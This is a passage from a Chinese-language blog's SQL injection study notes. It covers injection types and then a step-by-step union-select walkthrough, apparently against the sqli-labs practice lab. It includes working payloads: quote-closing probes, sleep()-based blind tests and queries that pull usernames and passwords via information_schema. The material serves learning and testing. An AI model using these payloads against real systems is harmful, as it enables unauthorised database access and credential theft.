href="https://11pmsleep.github.io/2022-10-09-WEB%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/SQL%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5%E5%8F%8A%E7%9F%A5%E8%AF%86/">SQL常用语句及知识</a></p><p><strong>注意：</strong></p><p><code>%</code>  的URL编码为 <code>%25</code>  ，空格 <code> &quot; &quot;</code>  的URL编码为 <code>%20</code> ，如果发现没有我们输入的 <code>%</code>  ，则我们可以手工添加编码 <code>%25</code> </p></blockquote><h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><blockquote><ul><li><code>1 and 1=1</code> 和<code>1 and 1=2</code>   判断是否是数字型</li></ul></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">为典型的数字型注入</span><br><span class="line"><span class="keyword">SQL</span><span class="operator">=</span> &quot;select name from users where id=1&quot;  </span><br><span class="line">#这种类型的注入参数为数字，在 users  表中查询用户输入的 id  值相对应的 name 的值。</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span>逻辑测试：</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>  <span class="keyword">sql</span>语句： <span class="keyword">select</span> name <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>  <span class="keyword">sql</span>语句： <span class="keyword">select</span> name <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line">#通过比较页面的变化判断输入是否被带入数据库执行。在这种情况下，如果是数字型，则第七行的语句是不会执行的，如果第七行代码可以得出一个数据，就表明<span class="keyword">sql</span>查询类型不是数字型。</span><br><span class="line">#不管是否是数字型第<span class="number">6</span>行大概率都是可以被执行的，对比第<span class="number">7</span>行和第<span class="number">6</span>行的效果</span><br><span class="line">#如果第<span class="number">6</span>行正常，第<span class="number">7</span>行报错，那么就是数字型</span><br><span class="line">#如果第<span class="number">6</span>行和第<span class="number">7</span>行均正常的执行了，那么便是字符型</span><br><span class="line"></span><br><span class="line">单引号测试：</span><br><span class="line">     <span class="string">&#x27;      sql语句： select name from users where id=1&#x27;</span></span><br><span class="line">#构造<span class="keyword">sql</span>语法错误，来判断输入是否被执行。</span><br></pre></td></tr></table></figure><h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><blockquote><ul><li><code>1 and 1=1</code> 和<code>1 and 1=2</code>   判断是否是字符型  </li><li><code>id=1&#39;</code>、<code>id=1&quot;</code>  判断输入是否被执行。判断是哪种引号的字符型注入</li></ul></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">=</span>&quot;select name from users where id=&#x27;1&#x27; &quot;</span><br><span class="line">字符型与数字型的不同：注入参数被引号包裹。</span><br><span class="line">构造参数传递，确认闭合方式的过程：</span><br><span class="line">    <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> 和 <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>   #判断是否是字符型   </span><br><span class="line">    <span class="keyword">SQL</span>语句： <span class="keyword">select</span> name <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1 and 1=1&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>#查出数据  确定是否是字符型（<span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span>查不出数据）</span><br><span class="line">    <span class="keyword">SQL</span>语句： <span class="keyword">select</span> name <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br><span class="line"> #或者</span><br><span class="line">    <span class="number">1</span><span class="string">&#x27; and 1=1 #</span></span><br><span class="line"><span class="string">    SQL语句： select name from users where id=&#x27;</span><span class="number">1</span><span class="string">&#x27; and 1=1 #&#x27;</span></span><br><span class="line">    <span class="number">1</span><span class="string">&#x27; and 1=2 #</span></span><br><span class="line"><span class="string">    SQL语句： select name from users where id=&#x27;</span><span class="number">1</span><span class="string">&#x27; and 1=2 #&#x27;</span></span><br><span class="line">    </span><br><span class="line">判断方法：id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;、id=1&quot;  构造sql语法错误，来判断输入是否被执行。判断是哪种引号的字符型注入</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    select name from users where id=&#x27;</span><span class="number">1</span><span class="string">&#x27;&#x27;</span> </span><br><span class="line">    #此时会语法报错,因为会多出一个单引号无法闭合</span><br><span class="line">    <span class="keyword">select</span> name <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&quot;&#x27;</span> </span><br><span class="line">    #此时不会语法报错，因为<span class="number">1</span>&quot;被当作字符串</span><br></pre></td></tr></table></figure><hr><h3 id="一个问题："><a href="#一个问题：" class="headerlink" title="一个问题："></a><strong>一个问题：</strong></h3><p>为什么输入<code>select name from users where id=&#39;1 and 1=1&#39;</code>，在字符型的注入中得出来的结果也是同<code>select name from users where id=&#39;1&#39;</code>一样呢？？甚至<code>select name from users where id=&#39;1 and 1=2&#39;</code>也得出来的是查找id&#x3D;’1’的结果?!</p><p><strong>网友解答如下：</strong></p><p><code>SELECT name FROM userinfo WHERE id = &#39;1 and 1=2&#39; ;</code>这句SQL是可以查询到结果的,当然前提是有<code>id=1</code>的数据。</p><p>其实，1后面的字符可以是任意的，不会影响查询，它甚至可以是：</p><p><code>SELECT name FROM userinfo WHERE id = &#39;1dsasasdasasd&#39; ;</code></p><p>那么为什么会这样呢？</p><p>经过测试，我发现这是因为<strong>id的类型为数值型</strong>，例如int，而查询的时候传入的是字符串，而MYSQL是十分智能的，它会进行<strong>类型转换</strong>，但是这个转换过程是很随意的，就像varchar 的’2asdasd’会被转成int的 2。</p><p>当然，如果id本身就是varchar类型的，那么数据库查询的时候就会进行精准的匹配，这样子’2adsdasd’等类似的数据由于数据库里没有匹配项,查询结果为空。</p><hr><h3 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a>搜索型</h3><blockquote><p><a href="https://blog.csdn.net/weixin_42277564/article/details/94401484SQL">sql注入-搜索型输入</a></p></blockquote><blockquote><p>搜索型与字符型相比多了一对 %  </p><p>搜索型注入，就是指注入点存在于搜索功能上，很多网站都有提供搜索功能，这里也可能存在注入的。</p><p><strong>判断搜索型注入的方法：</strong></p><blockquote><p>1 搜索<code>&#39;</code>，如果出错的话，有90%的可能性存在漏洞；</p><p>2 搜索<code>%</code>，如果同样出错的话，就有95%的可能性存在漏洞；</p><p>3 搜索<code>% &#39;and 1=1 and &#39;%&#39;=&#39;</code>（这个语句的功能就相当于普通SQL注入的 and 1&#x3D;1）看返回的情况</p><p>4 搜索<code>% &#39;and 1=2 and &#39;%&#39;=&#39;</code>（这个语句的功能就相当于普通SQL注入的 and 1&#x3D;2）看返回的情况</p><p>5 根据两次的返回情况来判断是不是搜索型文本框注入</p></blockquote></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">=</span> &quot;select * from users where name like &#x27;%tom%&#x27; &quot;</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="keyword">SQL</span>查询语句为：<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">like</span> <span class="string">&#x27;%1 and 1=1%&#x27;</span></span><br><span class="line">这个输入显然会报错误。</span><br><span class="line"><span class="number">1</span><span class="operator">%</span><span class="string">&#x27;1 and &#x27;</span><span class="operator">%</span><span class="number">1</span><span class="operator">%</span><span class="string">&#x27;&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;%1   还是     tom%&#x27;</span> <span class="keyword">and</span>  <span class="string">&#x27;%1%&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;%1   呢  老师好像写错了</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &#x27;</span><span class="operator">%</span>tom<span class="operator">%</span><span class="string">&#x27; = &#x27;</span><span class="operator">%</span><span class="number">1</span><span class="operator">%</span><span class="string">&#x27;1 and &#x27;</span><span class="operator">%</span><span class="number">1</span><span class="operator">%</span><span class="string">&#x27;&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;%1%&#x27;</span>  </span><br><span class="line"><span class="keyword">SQL</span>查询语句：<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;%tom%&#x27;</span> <span class="keyword">and</span>  <span class="string">&#x27;%1%&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;%1%&#x27;</span></span><br><span class="line">    tom<span class="operator">%</span><span class="string">&#x27; and  &#x27;</span><span class="operator">%</span><span class="number">1</span><span class="operator">%</span><span class="string">&#x27; = &#x27;</span><span class="operator">%</span><span class="number">1</span>这里我们用 <span class="string">&#x27;% 来闭合 %&#x27;</span> ，如果存在漏洞，返回正常信息。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">检查是否有搜索型注入的方法：</span><br><span class="line">查询语句：<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> sqltest <span class="keyword">where</span> names <span class="keyword">like</span> <span class="string">&#x27;%要查询的关键字%&#x27;</span></span><br><span class="line">在搜索框内输入<span class="number">1</span><span class="operator">%</span><span class="string">&#x27; and 1=1 and &#x27;</span><span class="operator">%</span><span class="string">&#x27;=&#x27;</span>正常回显；</span><br><span class="line">在搜索框内输入<span class="number">1</span><span class="operator">%</span><span class="string">&#x27; and 1=2 and &#x27;</span><span class="operator">%</span><span class="string">&#x27;=&#x27;</span>报错则存在注入，之后搜索关键词。</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意：</strong></p><p> <code>%</code>  的URL编码为 <code>%25</code>  ，空格 <code> &quot; &quot;</code>  的URL编码为 <code>%20</code> ，如果发现没有我们输入的 <code>%</code>  ，则我们可以手工添加编码 <code>%25</code> </p></blockquote><h2 id="按数据库返回结果分类"><a href="#按数据库返回结果分类" class="headerlink" title="按数据库返回结果分类"></a>按数据库返回结果分类</h2><h3 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h3><blockquote><p>在注入点的当前页面中获取返回结果。</p></blockquote><h4 id="常用SQL注入测试代码："><a href="#常用SQL注入测试代码：" class="headerlink" title="常用SQL注入测试代码："></a>常用SQL注入测试代码：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>         ————数字型</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span>       ————字符型</span><br><span class="line"></span><br><span class="line">或者是<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>时可以查询，而<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>查询不出来，则可以验证存在漏洞</span><br></pre></td></tr></table></figure><blockquote><p>代码原理：利用逻辑运算符or 的运算原理，只要其中一个条件满足为真，则为真，而1&#x3D;1恒等式恒为真，因此如果上面三个代码输入之后页面显示结果都为正常，则我们可以判断此页面存在SQL注入漏洞</p></blockquote><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>程序将数据库的返回错误信息直接显示在页面中，虽然没有返回数据库的查询结果，但是可以通过构造一些报错语句从数据库返回并显示的错误信息中获取想要的结果。</p><p>在 SQLServer 中通常错误的查询会返回一些错误信息，在 mysql 中正常情况下是没有错误信息返回的，但可以通过其他的方式进行错误信息的提取。</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>由于程序后端限制数据库返回错误信息，因此查询错误或没有结果时是没有信息返回的，可以通过数据库的查询逻辑和延时函数来对注入的结果进行判断。</p><p>根据注入表现形式的不同，盲注又分为 <code>Based boolean</code> 和 <code>Based time</code> 两种类型。</p><h4 id="基于布尔的盲注Based-boolean"><a href="#基于布尔的盲注Based-boolean" class="headerlink" title="基于布尔的盲注Based boolean"></a>基于布尔的盲注Based boolean</h4><blockquote><ul><li>一是无报错信息返回；</li><li>二是无论输入是正确还是错误，都只会显示两种情况（1 或 0）(ture 或 false)；</li><li>三是在输入正确时，可通过输入and 1&#x3D;1、and 1&#x3D;2判断。</li></ul></blockquote><h4 id="基于时间的盲注-Based-time"><a href="#基于时间的盲注-Based-time" class="headerlink" title="基于时间的盲注 Based time"></a>基于时间的盲注 Based time</h4><blockquote><ul><li>基于Boolean的盲注可以在页面上看到正确或错误的回显，但是基于time的盲注是看不到的。</li><li>判断：通过”时间”条件进行特定的输入，判断后台执行SQL语句的时间来判断是否存在盲注。比如 <code>m&#39; and sleep(5) #</code>  语句，通过页面显示的时间来判断是否存在基于时间的盲注。</li><li>可以通过在mysql语句中使用if构造查询语句</li></ul><p><strong>比如：</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">m<span class="string">&#x27; and if ((substr((select database()),1,1))=&#x27;</span>a<span class="string">&#x27;,sleep(5),null) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#通过substr对查询到的database()结果截取第一位的值，判断其否等于a，如果等于则判断为真，执行sleep(5),如果不等于则判断为假，则null, 然后通过sleep(5)执行后的时间来确认所查询的值是否正确，遍历出所有的值。</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="按注入点位置分类"><a href="#按注入点位置分类" class="headerlink" title="按注入点位置分类"></a>按注入点位置分类</h2><h3 id="GET注入"><a href="#GET注入" class="headerlink" title="GET注入"></a>GET注入</h3><p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。<code>http://test.com/news.php?id=1</code></p><h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p><blockquote><p>HTTP  定义了与服务器交互的不同方法，其中最基本的方法就是 GET  和 POST  。</p><p>GET  方式在客户端通过 URL  提交数据，数据在 URL  中可以看到；</p><p>POST  方式，数据放置在 Body  内提交，数据在 URL  中看不到。</p></blockquote><h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p><h3 id="Header注入"><a href="#Header注入" class="headerlink" title="Header注入"></a>Header注入</h3><p>注入点在 HTTP  请求头部的某个字段中。比如存在 User-Agent  字段中。</p><p>Cookie  注入其实应该也是算 Header  注入的一种形式。因为在 HTTP  请求的时候， Cookie  是头部的一个字段。</p><blockquote><p>头部注入原理：服务器端可能会保存用户的IP及User-Agent等信息，此时，攻击者可以在X-Forwarded-For 或UA等请求头字段中构造语句进行SQL注入。</p></blockquote><h2 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h2><h3 id="Double-Injection原理浅析（构造报错注入）"><a href="#Double-Injection原理浅析（构造报错注入）" class="headerlink" title="Double Injection原理浅析（构造报错注入）"></a>Double Injection原理浅析（构造报错注入）</h3><blockquote><p><a href="https://blog.csdn.net/wn314/article/details/89297560">https://blog.csdn.net/wn314/article/details/89297560</a></p></blockquote><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><blockquote><p><a href="https://www.bilibili.com/video/BV1sS4y1S7Hr?spm_id_from=333.337.search-card.all.click&amp;vd_source=e73a152dada4626bad49c30d848902f7">https://www.bilibili.com/video/BV1sS4y1S7Hr?spm_id_from=333.337.search-card.all.click&amp;vd_source=e73a152dada4626bad49c30d848902f7</a></p></blockquote><h3 id="内联注入"><a href="#内联注入" class="headerlink" title="内联注入"></a>内联注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*!/*!*/</span></span><br><span class="line"><span class="comment">/* */</span> 在mysql中是多行注释 但是如果里面加了<span class="operator">!</span> 那么后面的内容会被执行</span><br><span class="line"><span class="keyword">select</span><span class="comment">/*123*/</span><span class="operator">*</span><span class="comment">/*123*/</span><span class="keyword">from</span><span class="comment">/*！user*/</span></span><br><span class="line">#所执行的功能就类似于</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span></span><br></pre></td></tr></table></figure><h3 id="二阶注入"><a href="#二阶注入" class="headerlink" title="二阶注入"></a>二阶注入</h3><p>攻击者在HTTP请求中提交恶意输入，服务端将恶意输入保存在数据库中，攻击者紧接着提交第二次HTTP请求。为处理第二次请求，服务端需要查找数据库，触发了之前存储的恶意输入，并将结果返回给攻击者。攻击者需要通过两次独立请求才可以实现SOL注入的目的，这种攻击方式因此得名二阶注入。</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h1 id="SQL注入利用"><a href="#SQL注入利用" class="headerlink" title="SQL注入利用"></a>SQL注入利用</h1><h2 id="GET显错注入"><a href="#GET显错注入" class="headerlink" title="GET显错注入"></a>GET显错注入</h2><blockquote><p>实验：<a href="http://hetianlab.com/expc.do?ec=ECID172.19.104.182014081415154700001">http://hetianlab.com/expc.do?ec=ECID172.19.104.182014081415154700001</a></p></blockquote><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="简单语法"><a href="#简单语法" class="headerlink" title="简单语法"></a>简单语法</h4><blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--+     注释符</span></span><br><span class="line">limit <span class="number">0</span>,<span class="number">1</span>     从你表中的第一个数据开始，只读取一个</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>      排序，判断字段数量，也就是表的列数</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span>  联合查询，连接前面语句，起着合并查询的作用</span><br><span class="line"><span class="keyword">union</span>特性：前一个<span class="keyword">sql</span>语句的字段数，要与后一个<span class="keyword">sql</span>语句字段数一样</span><br><span class="line">group_concat  合并多行数据到一行</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑运算符：<span class="keyword">and</span>、<span class="keyword">or</span>、xor</span><br><span class="line"><span class="keyword">and</span>：并且，前后两条语句必须全为真，才为真，否则为假。</span><br><span class="line"><span class="keyword">or</span>：或者，前后两条语句一条为真，就为真。</span><br><span class="line">xor：非</span><br><span class="line">在<span class="keyword">sql</span>语言中，<span class="keyword">and</span>优先级大于<span class="keyword">or</span></span><br><span class="line"></span><br><span class="line"><span class="operator">!=</span>：不等于。</span><br></pre></td></tr></table></figure></blockquote><h4 id="信息收集语法"><a href="#信息收集语法" class="headerlink" title="信息收集语法"></a>信息收集语法</h4><blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">version()    当前数据库版本</span><br><span class="line">database() schema()  当前数据库  </span><br><span class="line"><span class="keyword">user</span>()       当前用户</span><br><span class="line">@<span class="variable">@datadir</span>    数据库数据路径 <span class="operator">/</span>var<span class="operator">/</span>lib<span class="operator">/</span>mysql<span class="operator">/</span> </span><br><span class="line">@<span class="variable">@version</span>_compile_os    操作系统版本</span><br><span class="line"></span><br><span class="line">注意到mysql中使用这些内置函数都要使用<span class="keyword">SELECT</span>关键字<span class="operator">~</span><span class="operator">~</span></span><br><span class="line"><span class="keyword">SELECT</span> version();</span><br></pre></td></tr></table></figure></blockquote><h4 id="判断注入类型-x2F-闭合方式"><a href="#判断注入类型-x2F-闭合方式" class="headerlink" title="判断注入类型&#x2F;闭合方式"></a>判断注入类型&#x2F;闭合方式</h4><blockquote><p>除了下面这种方法判断闭合方式，剩下的就是一点一点的去判断注入类型了，在sql注入分类，以及下面的注入例子中，都提到了判断是数字型还是字符型，如果是字符型那么是单引号还是双引号，亦或者引号加括号闭合</p><blockquote><p>有时候用反斜杠是没有回显的，只能当作一种参考方式，如果反斜杠不行的时候，就使用单引号双引号啊，那些方法去试错</p></blockquote></blockquote><blockquote><p><code>\</code>表示转义，直接输入<code>\</code>会将字段的闭合方式暴露出来，因为被转义不生效，导致 SQL 语句报错。并爆出闭<br>合方式。</p><p>例如：</p><p><code>&#39;&#39;1\&#39;) LIMIT 0,1&#39;</code> ,发现<code>\</code>转义后有一个单引号即括号，说明此 sql 语句基于单引号括号闭合。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.1.63/sqli-labs/Less-1/?id=1\</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211121546402.png" alt="image-20221112154610025"></p></blockquote><h3 id="GET显错注入流程概览"><a href="#GET显错注入流程概览" class="headerlink" title="GET显错注入流程概览"></a>GET显错注入流程概览</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">01</span>、获取字段数    <span class="keyword">order</span> <span class="keyword">by</span> x</span><br><span class="line"><span class="number">02</span>、获取显示位    <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>……</span><br><span class="line"><span class="number">03</span>、获取数据库信息      version()，<span class="keyword">user</span>()，@<span class="variable">@datadir</span>，@<span class="variable">@version</span>_compile_os</span><br><span class="line"><span class="number">04</span>、获取当前数据库      database()， schema() ,</span><br><span class="line"><span class="number">05</span>、获取所有数据库</span><br><span class="line"><span class="number">06</span>、获取数据库表</span><br><span class="line"><span class="number">07</span>、获取所有字段</span><br><span class="line"><span class="number">08</span>、获取数据</span><br></pre></td></tr></table></figure><h3 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">判断什么类型：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1 --+    id=-1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>语句判断字段数量：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3 --+</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">联合查询获取显示位，显示在什么地方：</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"> </span><br><span class="line">获取当前数据库：</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select database()),3 --+</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">获取所有数据库：</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">--+</span></span><br><span class="line"> </span><br><span class="line">获取当前数据库所以表名：</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">获取users表所有字段：</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="comment">--+</span></span><br><span class="line"> </span><br><span class="line">获取security.users表所有字段</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; and table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">获取security.users表所有字段内容：</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,password <span class="keyword">from</span> users <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="注入例子"><a href="#注入例子" class="headerlink" title="注入例子"></a>注入例子</h3><h4 id="判断-SQL注入是否存在"><a href="#判断-SQL注入是否存在" class="headerlink" title="判断 SQL注入是否存在"></a>判断 SQL注入是否存在</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;      &quot;      \</span></span><br><span class="line"><span class="string">单引号报错，双引号不报错</span></span><br><span class="line"><span class="string">一般的，如果页面返回错误，则存在 Sql 注入。</span></span><br><span class="line"><span class="string">原因是无论字符型还是整型都会因为单引号个数不匹配而报错。</span></span><br><span class="line"><span class="string">&lt;这个地方不是很理解写的时什么意思&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1 or 1=1         ————数字型</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1=1       ————字符型</span></span><br></pre></td></tr></table></figure><h4 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">数字型：</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line">输入 http:<span class="operator">/</span><span class="operator">/</span>xxx<span class="operator">/</span>abc.php?id<span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> 页面依旧运行正常，继续进行下一步。</span><br><span class="line">输入 http:<span class="operator">/</span><span class="operator">/</span>xxx<span class="operator">/</span>abc.php?id<span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> 页面运行错误，则说明此 <span class="keyword">Sql</span> 注入为数字型注入</span><br><span class="line">原因如下：</span><br><span class="line">原因如下： 当输入 <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>时，后台执行 <span class="keyword">Sql</span> 语句：</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> </span><br><span class="line">没有语法错误且逻辑判断为正确，所以返回正常。</span><br><span class="line">当输入 <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>时，后台执行 <span class="keyword">Sql</span> 语句：</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line">没有语法错误但是逻辑判断为假，所以返回错误。 我们再使用假设法：</span><br><span class="line">如果这是字符型注入的话，我们输入以上语句之后应该出现如下情况：</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;x and 1=1&#x27;</span> </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;x and 1=2&#x27;</span> </span><br><span class="line">查询语句将 <span class="keyword">and</span> 语句全部转换为了字符串，并没有进行 <span class="keyword">and</span> 的逻辑判断，</span><br><span class="line">所以不会出现以上结果，即全都会查询出id<span class="operator">=</span><span class="number">1</span>的结果，故假设是不成立的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">字符型</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=1-- -</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>    <span class="comment">-- -</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>mingy.lab<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27; =&#x27;</span><span class="number">1</span> </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>mingy.lab<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span 